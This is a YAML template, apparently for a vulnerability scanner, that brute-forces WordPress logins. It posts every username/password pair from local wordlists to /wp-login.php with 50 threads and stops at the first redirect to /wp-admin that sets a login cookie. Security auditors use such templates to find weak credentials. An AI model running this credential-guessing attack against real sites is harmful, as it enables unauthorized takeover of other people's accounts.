info:
  id: wordpress-weak-credentials
  name: WordPress Weak Credentials
  author: Hung, Dat, Danh, Hoa
  severity: critical
  tags: wordpress,default-login,fuzz

requests:
  - request:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}

        log={{users}}&pwd={{passwords}}

    payloads:
      users: C:\Users\Admin\Desktop\Injection-Tool\config\users.txt
      passwords: C:\Users\Admin\Desktop\Injection-Tool\config\passwords.txt
    threads: 50
    scanMode: clusterbomb
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302

      - type: word
        word:
          - '/wp-admin'
          - 'wordpress_logged_in'
        condition: and
        part: header